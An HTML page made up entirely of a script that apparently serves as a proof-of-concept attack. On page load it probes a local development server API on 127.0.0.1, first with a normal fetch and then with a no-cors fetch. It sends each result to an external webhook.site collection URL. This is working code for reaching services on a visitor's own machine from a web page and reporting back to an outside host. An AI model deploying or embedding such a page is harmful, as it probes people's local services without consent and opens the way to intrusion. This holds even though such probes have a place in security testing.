<!DOCTYPE html>
<html><body>
<script>
(async () => {
  const rojo = 'http://127.0.0.1:34872/api/rojo';
  const home = 'https://webhook.site/d5fb5dae-1544-4959-b12d-bcd731668f12';
  const say  = (k, v) => fetch(home + '?' + k + '=' + encodeURIComponent(v), { mode: 'no-cors' });

  // Test A — normal fetch (only works if CORS is open)
  try { const r = await fetch(rojo); say('A_cors', 'SUCCESS status=' + r.status); }
  catch (e) { say('A_cors', 'FAIL ' + e.message); }

  // Test B — no-cors fetch (works if the request REACHES Rojo at all, even without CORS)
  try { await fetch(rojo, { mode: 'no-cors' }); say('B_nocors', 'SUCCESS-request-reached-it'); }
  catch (e) { say('B_nocors', 'FAIL ' + e.message); }
})();
</script>
</body></html>
